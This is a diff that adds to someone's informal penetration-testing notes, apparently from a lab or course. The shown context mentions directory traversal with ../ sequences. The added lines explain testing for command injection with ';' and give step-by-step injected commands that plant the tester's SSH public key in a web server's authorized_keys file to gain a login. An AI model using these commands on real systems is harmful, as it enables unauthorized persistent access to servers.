@@ -74,3 +74,15 @@ Steps to make http server:
 
 you can traverse the web server using ../../../../ etc...
 
+; command is used to test for command injection
+----------------------------------------------------------------------------
+getting onto a system with command injection:
+
+	(1) get into the hidden .ssh folder ls -la (cd .ssh)
+	(2) ssh keygen -t rsa -b 4096 (generate keys) don't enter a passphrase
+
+	(On the webserver) ; mkdir /var/home dir/.ssh (check with l -la)
+	(make authorization file) ; echo "the whole contents of the id_rsa.pub" > var/home dir/.ssh/authorized_keys ( get the public key from your work station and copy the whole thing.)
+	(make sure it worked) ; cat var/home dir/.ssh/authorized_keys
+	(then ssh) ssh user from webserver@IPofWebserver
+
